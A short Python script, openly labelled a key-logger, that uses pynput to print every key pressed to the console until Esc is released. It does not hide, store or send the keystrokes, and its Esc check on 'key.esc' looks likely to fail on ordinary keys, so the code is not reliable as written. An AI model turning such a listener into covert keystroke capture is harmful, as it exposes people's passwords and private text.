import pynput

from pynput.keyboard import Key, Listener

print("starting key-logger...")


def on_press(key):
    print(" {0} pressed".format(key))


def on_release(key):
    if key == key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
